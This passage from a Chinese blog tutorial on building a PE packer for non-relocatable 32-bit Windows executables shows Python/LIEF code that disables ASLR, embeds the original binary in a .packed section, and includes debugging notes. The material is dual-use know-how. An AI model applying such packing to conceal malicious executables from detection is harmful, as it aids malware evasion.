&lt;span class="n">highest_rva&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">max&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">virtual_address&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">size&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">s&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">binary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="n">sect_alignment&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">binary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">section_alignment&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;[+] analyze origin demo program binary success.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># %%&lt;/span>
&lt;span class="c1"># compile shifted loader program&lt;/span>
&lt;span class="n">compile_args&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="s1">&amp;#39;loader.c&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-m32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-O2&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-Wall&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-Wl,--entry=__start&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-nodefaultlibs&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-nostartfiles&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-lkernel32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-luser32&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;-Wl,--image-base=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">image_base&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;-Wl,--section-start=.text=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">align&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">image_base&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">highest_rva&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">sect_alignment&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;-o&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s1">&amp;#39;shifted-loader.exe&amp;#39;&lt;/span>
&lt;span class="p">]&lt;/span>
&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">check_output&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39; &amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s1">&amp;#39;gcc&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">compile_args&lt;/span>&lt;span class="p">]),&lt;/span> &lt;span class="n">shell&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stderr&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">STDOUT&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;[+] compile shifted loader program success.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">except&lt;/span> &lt;span class="n">CalledProcessError&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;[!] loader compilation failed, &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">raise&lt;/span>
&lt;span class="n">shifted_loader&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;shifted-loader.exe&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">sect_alignment&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">section_alignment&lt;/span>
&lt;span class="n">file_alignment&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">file_alignment&lt;/span>
&lt;span class="c1"># %%&lt;/span>
&lt;span class="c1"># create new binary from scratch&lt;/span>
&lt;span class="n">output&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Binary&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;packed&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE_TYPE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE32&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># copy essential fields from shifted_loader&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">imagebase&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">imagebase&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">section_alignment&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">section_alignment&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">file_alignment&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">file_alignment&lt;/span>
&lt;span class="c1"># disable ASLR&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dll_characteristics&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="c1"># add .alloc section&lt;/span>
&lt;span class="n">allocate_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">align&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">highest_rva&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">lowest_rva&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sect_alignment&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">allocate_section&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.alloc&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">allocate_section&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">virtual_address&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lowest_rva&lt;/span>
&lt;span class="n">allocate_section&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">virtual_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">allocate_size&lt;/span>
&lt;span class="n">allocate_section&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">characteristics&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SECTION_CHARACTERISTICS&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">MEM_READ&lt;/span>
&lt;span class="o">|&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SECTION_CHARACTERISTICS&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">MEM_WRITE&lt;/span>
&lt;span class="o">|&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SECTION_CHARACTERISTICS&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">CNT_UNINITIALIZED_DATA&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">add_section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">allocate_section&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># copy sections&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">s&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1"># let lief recalculate section offset and sizeof raw data&lt;/span>
&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sizeof_raw_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">add_section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># add packed section&lt;/span>
&lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;example.exe&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;rb&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">packed_section&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;.packed&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">packed_section&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">list&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="n">packed_section&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">characteristics&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SECTION_CHARACTERISTICS&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">MEM_READ&lt;/span> &lt;span class="o">|&lt;/span>
&lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SECTION_CHARACTERISTICS&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">CNT_INITIALIZED_DATA&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">add_section&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">packed_section&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># copy data directories&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">src&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data_directories&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data_directories&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rva&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">rva&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data_directories&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">size&lt;/span>
&lt;span class="c1"># correct number of data directories&lt;/span>
&lt;span class="c1"># warning: size of data directories may disagree with IMAGE_NT_HEADERS.DataDirectory in winnt.h&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">numberof_rva_and_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data_directories&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># copy original address of entrypoint&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">addressof_entrypoint&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">shifted_loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">addressof_entrypoint&lt;/span>
&lt;span class="c1"># let lief recalculate size of image&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sizeof_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="c1"># build output binary&lt;/span>
&lt;span class="n">builder&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Builder&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">output&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">builder&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">build&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">builder&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;packed.exe&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;[+] create packed binary success.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>只放一下加载器代码，一共三个代码文件托管在 Gist 上，需要安装 MinGW 和 LIEF，配置方式不赘述。还不会 C 和 Python 的话建议学一下先呢。&lt;/p>
&lt;p>&lt;a class="link" href="https://gist.github.com/nnnewb/28ca24ed4ee53f446120d64570c7ad01" target="_blank" rel="noopener"
>完整代码的 GIST&lt;/a>&lt;/p>
&lt;h2 id="0x05-成果">0x05 成果&lt;/h2>
&lt;p>加壳机运行效果。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/%E5%8A%A0%E5%A3%B3%E6%9C%BA.gif"
loading="lazy"
alt="加壳机"
>&lt;/p>
&lt;p>&lt;code>packed.exe&lt;/code> 的节表信息如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-03-support-no-relocations/image-20211020095008599.png"
width="507"
height="296"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-03-support-no-relocations/image-20211020095008599_hu133cb724811b185855f9a631cc001e91_10916_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-03-support-no-relocations/image-20211020095008599_hu133cb724811b185855f9a631cc001e91_10916_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211020095008599"
class="gallery-image"
data-flex-grow="171"
data-flex-basis="411px"
>&lt;/p>
&lt;h2 id="结论">结论&lt;/h2>
&lt;p>整个过程里踩了不少坑，几乎都要靠 x32dbg 调试和 CFF Explorer 挨个文件头字段检查。有个比较实用的做法是拿 LIEF 解析好加壳后的文件，把输出结果和原始加载器对比。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">import&lt;/span> &lt;span class="nn">lief&lt;/span>
&lt;span class="n">packed&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;packed.exe&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">loader&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lief&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PE&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;shifted-loader.exe&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;packed-analysis.txt&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;w+&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">encoding&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">out&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;-----&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;packed.exe&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;-----&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">packed&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">header&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">packed&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">entry&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">packed&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data_directories&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">s&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">packed&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;loader-analysis.txt&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;w+&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">encoding&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">out&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;-----&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;shifted-loader.exe&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;-----&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">header&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">optional_header&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">entry&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data_directories&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">entry&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">s&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">loader&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>分析好之后就可以拿 vscode 去比较了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">code -n -d packed-analysis.txt loader-analysis.txt
&lt;/code>&lt;/pre>&lt;/div>&lt;p>比起直接拿 CFF Explorer 硬看字段哪儿不对，和编译器产生的正常文件比较能排除掉一些无关的字段。但也不是万能，比如说之前没有写 &lt;code>section.offset=0&lt;/code>，结果生成的 PE32 文件导入表内容坏了，一直没意识到。直到 x32dbg 调试中发现 ntdll 里加载导入表时碰到了一个无效地址（我怎么知道是加载导入表时呢，胆大心细加上99%的运气&amp;hellip;），然后看 CFF Explorer 才发现导入表完全挂了，再回头看节表才发现 &lt;code>.idata&lt;/code> 的偏移和大小都是坏的&amp;hellip;&lt;/p>
&lt;p>还有 data directories 的坑，也是靠 x32dbg，跳转到内存，才发现 &lt;code>(IMAGE_SECTION_HEADER*)(PIMAGE_NT_HEADERS+1)&lt;/code> 算出来的偏移值多了8字节，冥思苦想这8字节怎么回事，胡乱分析，然后突然意识到 data directory 正好 8 字节，加壳机里又有个很迷惑的 &lt;code>range(0,15)&lt;/code>，反复确认了几次才发现真的是 LIEF 就给了 15 个 Data directory —— 但 Windows SDK 里 &lt;code>winnt.h&lt;/code> 定义的是 &lt;strong>固定 16 个元素&lt;/strong> ，之后去翻 PE Format 文档才发现微软早就挖好了这个坑等你翻文档：&lt;/p>
&lt;blockquote>
&lt;p>Note that the number of directories is not fixed. Before looking for a specific directory, check the NumberOfRvaAndSizes field in the optional header.&lt;/p>
&lt;/blockquote>
&lt;p>原先的文章预计是要做一个压缩壳，简单试验了一下没啥难度，代码都不用几行（VS+CMake+VCPKG 同时用 LIEF 和 ZLIB/LZO 什么的有点费劲，所以用 Windows Compression API），就这样水一篇文章有点不好意思。所以就先去看怎么对付不能重定位的PE32了，结果搞 LIEF 的各种环境编译、折腾VC++的Pragma、翻 Linker Script 手册看能不能改节表偏移、学NASM、从国庆坑到现在。&lt;/p>
&lt;p>本篇的参考文章是：https://bidouillesecurity.com/tutorial-writing-a-pe-packer-part-4/&lt;/p>
